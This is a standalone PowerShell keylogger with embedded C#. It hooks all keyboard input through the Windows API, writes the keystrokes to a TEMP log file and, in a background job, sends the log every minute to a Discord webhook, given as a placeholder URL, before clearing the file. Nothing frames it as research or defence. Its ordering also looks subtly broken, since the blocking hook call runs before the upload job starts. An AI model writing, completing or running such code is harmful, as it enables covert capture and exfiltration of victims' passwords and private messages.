$webhook = "YOUR_DISCORD_WEBHOOK_URL"
$logfile = "$env:TEMP\keystrokes.log"
$interval = 60  # Time in seconds to send logs to Discord

# Create low-level keyboard hook
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyboardHook {
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hInstance);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Start() {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            System.IO.File.AppendAllText(@"$env:TEMP\keystrokes.log", ((Keys)vkCode).ToString() + " ");
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@ -Language CSharp

[KeyboardHook]::Start() | Out-Null

# Function to send logs to Discord
function Send-Logs {
    while ($true) {
        Start-Sleep -Seconds $interval
        if (Test-Path $logfile) {
            $content = Get-Content $logfile -Raw
            if ($content) {
                Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body (@{content=$content} | ConvertTo-Json)
                Clear-Content $logfile
            }
        }
    }
}

# Run in background
Start-Job -ScriptBlock ${function:Send-Logs}
